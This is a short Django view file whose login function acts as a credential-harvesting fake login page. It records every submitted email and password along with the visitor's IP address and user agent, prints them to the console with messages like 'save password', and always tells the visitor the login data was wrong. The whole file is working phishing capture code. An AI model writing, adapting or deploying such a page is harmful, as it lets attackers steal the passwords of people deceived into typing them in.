import datetime

from django.contrib import messages
from django.shortcuts import render
from colorama import Fore, Style
from web.forms import LoginForm


# Create your views here.
def login(request):


    meta = request.META
    ip = meta['REMOTE_ADDR']
    description = meta['HTTP_USER_AGENT']
    login_form = LoginForm()
    context = {'form':login_form}
    template = "web/login.html"

    if request.method == "POST":
        print(Fore.LIGHTYELLOW_EX, "[!] probe this ", ip)
        login_form = LoginForm(request.POST)
        login_form = login_form.save(commit=False)
        print(Fore.GREEN, "[+] save username ", request.POST.get('email'))
        print(Fore.GREEN, "[+] save password ", request.POST.get('password'))
        print(Style.RESET_ALL)
        print()

        login_form.ip = ip
        login_form.agent = description
        login_form.created_at = datetime.datetime.now()
        login_form.save()

        messages.warning(request,"Wrong login data")
        return render(request, template, context)


    return render(request,template,context)